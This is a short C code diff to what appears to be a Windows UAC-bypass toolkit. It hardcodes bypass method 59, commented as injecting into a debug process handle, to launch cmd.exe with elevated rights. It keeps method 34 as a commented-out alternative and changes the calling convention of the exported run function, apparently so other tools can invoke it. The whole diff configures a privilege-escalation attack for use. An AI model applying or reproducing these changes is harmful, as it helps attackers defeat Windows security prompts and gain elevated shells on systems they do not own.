@@ -255,14 +255,18 @@ NTSTATUS WINAPI ucmMain(
 
     //hard code in the params, cause can't get them to pass in.
     //good methods are 34 and 59
-    method = 59;
-    OptionalParameter = L"C:\\Windows\\System32\\.exe";
-    OptionalParameterLength = 35;
 
-    //OptionalParameter = L"";
-    //OptionalParameterLength = 0;
+    //inject into debug process handle
+    method = 59;
+    OptionalParameter = L"C:\\Windows\\system32\\cmd.exe";
+    OptionalParameterLength = 35;
     OutputToDebugger = 1;
 
+    //always notify goodness
+    //method = 34;
+    //OptionalParameter = L"C:\\Windows\\system32\\cmd.exe";
+    //OptionalParameterLength = 35;
+    //OutputToDebugger = 1;
 
     Status = ucmInit(&method,
         OptionalParameter,
@@ -373,7 +377,7 @@ DWORD WINAPI ucmCalleeThread(_In_ LPVOID lpParameter)
 * Dll only export.
 *extern __declspec (dllexport)
 */
-extern __declspec(dllexport) NTSTATUS __cdecl ucmRunMethod(
+extern __declspec(dllexport) NTSTATUS __stdcall ucmRunMethod(
     _In_ UCM_METHOD Method,
     _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
     _In_ ULONG OptionalParameterLength,
